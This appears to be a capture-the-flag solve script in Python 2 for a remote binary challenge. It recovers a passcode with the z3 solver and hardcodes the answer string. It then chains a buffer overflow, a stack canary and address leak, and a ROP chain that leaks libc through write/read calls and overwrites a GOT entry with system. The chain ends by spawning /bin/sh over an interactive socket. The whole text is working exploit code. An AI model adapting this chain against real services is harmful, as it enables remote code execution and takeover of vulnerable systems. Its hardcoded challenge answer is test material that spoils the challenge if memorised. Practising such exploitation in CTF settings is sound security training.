from z3 import *
import socket
import struct
import telnetlib
from hexdump import *
key =[0xA6,0x35,0xAe,0x1F,0xF1,0x33,0x9F,0x71,0xB4,0x61,0xE1,0x61,0xBD,0x76,0xB4,0xFD,0x0C,0x32,0xBC,0xDB,0x74,0x6F,0xC9,0xF1,0x76,0x42]
print len(key)
table = [ BitVec('a1_%i'%i,8) for i in range(0,len(key))]
k = 0x10101010

tmp1 = table[:13]
tmp2 = table[13:]
for i in range(0,4):
	for j in range(0,13):
		tmp3 = (2*k)^tmp1[j]^tmp2[j]
		tmp1[j] = tmp2[j]
		tmp2[j] = tmp3
		k ^= 2*k
	print i 
s= Solver()
res = tmp1
res += tmp2
for i in range(0,len(key)):
	s.add(res[i] == key[i])
print s.check()
password = []
model = s.model()
'''
for i in model:
	idx = int(str(i)[3:])
	val = model[i].as_long()
	password.append(val)
print model
'''
password = [112,97,115,115,99,111,100,101,123,72,48,119,95,102,117,110,95,49,115,95,49,116,33,33,33,125]

def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r
#s = socket.create_connection(['0',1234])
s = socket.create_connection(['prob.layer7.kr',10005])
raw_input()
recvu(s,'input passcode :')
dat = ""
dat += "A"*4
dat += "\x00"*((0xdc-0xb4)-len(dat))
dat += "A"*4
dat += "\x00"
s.send(dat+'\n')
recvu(s,'>>>')
s.send('root_auth\n')
dat = ""
for i in range(0,len(password)):
	dat += struct.pack('<B',password[i])
s.send(dat+'\n')
print dat
recvu(s,'>>>')
s.send("root_auth\n")
s.send(dat+'\n')
recvu(s,'>>>')
s.send("root_auth\n")
s.send(dat+'\n')
recvu(s,'>>>')
s.send('echo '+"A"*0x3f+'\n')
r = recvu(s,'>>>')
print hexdump(r)
canary = struct.unpack('<I','\x00'+r[0x41:0x44])[0]
stack = struct.unpack('<I',r[0x44:0x48])[0]+0x63-0xc6
print hex(canary)
print hex(stack)
gadget = struct.pack('<I',0x08048d39) # pppr
dat = ""
dat +="AAAA"
dat += "CCCCC"
dat += struct.pack('<I',0x8048480) #write
#dat += struct.pack('<I',0x41414141)
dat += gadget
dat += struct.pack('<I',1)
dat += struct.pack('<I',0x804b028)
dat += struct.pack('<I',4)

dat += struct.pack('<I',0x8048420) #read
dat += gadget
dat += struct.pack('<I',0)
dat += struct.pack('<I',0x804b010)
dat += struct.pack('<I',4)

dat += struct.pack('<I',0x8048420)
dat += "AAAA"
dat += struct.pack('<I',stack+len(dat)+4)
dat += "/bin/sh"
dat += "B"*(0x3f-1-len(dat))
dat += struct.pack('<I',canary)
dat += struct.pack('<I',stack+4+4)
s.send(dat)
recvu(s,'>>>')
s.send('exit\n')
recvu(s,'Bye !!\x0a')
libc = struct.unpack('<I',s.recv(4))[0] - 0x0D4490
system = libc + 0x003A920
s.send(struct.pack('<I',system))
t = telnetlib.Telnet()
t.sock = s
t.interact()
